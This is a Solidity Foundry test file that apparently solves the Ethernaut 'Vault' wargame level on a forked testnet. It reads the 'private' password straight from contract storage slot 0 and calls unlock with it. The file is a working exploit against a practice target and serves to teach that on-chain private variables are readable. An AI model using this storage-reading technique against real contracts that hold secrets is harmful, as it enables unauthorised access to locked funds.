pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../lib/forge-std/src/vm.sol";
import "../lib/forge-std/src/console2.sol";
import "../src/Vault/Vault.sol";

contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address Alice = address(15);
    address INSTANCE_LEVEL_ADDRESS = 0x84269C717CfE1f73000193bBC50EF474A54eC58b;

    function testVault() public {
      vm.createFork('https://rpc.ankr.com/eth_rinkeby');
      vm.startPrank(Alice);
      Vault vault = Vault(payable(INSTANCE_LEVEL_ADDRESS));
      bytes32 password = bytes32(vm.load(INSTANCE_LEVEL_ADDRESS,bytes32(uint256(0))));
      emit log_named_bytes32('pass: ', password);
      vault.unlock(password);
    }
}